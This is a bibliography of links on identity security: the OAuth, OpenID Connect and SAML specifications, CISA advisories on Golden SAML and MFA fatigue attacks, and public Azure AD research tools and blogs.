- OAuth 2.0 RFC 6749: [datatracker.ietf.org/doc/html/rfc6749](https://datatracker.ietf.org/doc/html/rfc6749)
- OpenID Connect Core 1.0: [openid.net/specs/openid-connect-core-1_0.html](https://openid.net/specs/openid-connect-core-1_0.html)
- SAML 2.0: [docs.oasis-open.org/security/saml/v2.0/](https://docs.oasis-open.org/security/saml/v2.0/)
- CISA AA21-008A (SolarWinds Golden SAML): [cisa.gov/news-events/cybersecurity-advisories/aa21-008a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a)
- CISA AA22-040A (LAPSUS$ MFA fatigue): [cisa.gov/news-events/cybersecurity-advisories/aa22-040a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a)
- ROADtools: [github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)
- AADInternals: [github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals)
- TokenTactics: [github.com/fireeye/TokenTactics](https://github.com/fireeye/TokenTactics)
- Dirkjanm's blog (Azure AD attack research): [dirkjanm.io](https://dirkjanm.io)
- Secureworks Nobelji research: [secureworks.com/blog](https://www.secureworks.com/blog)
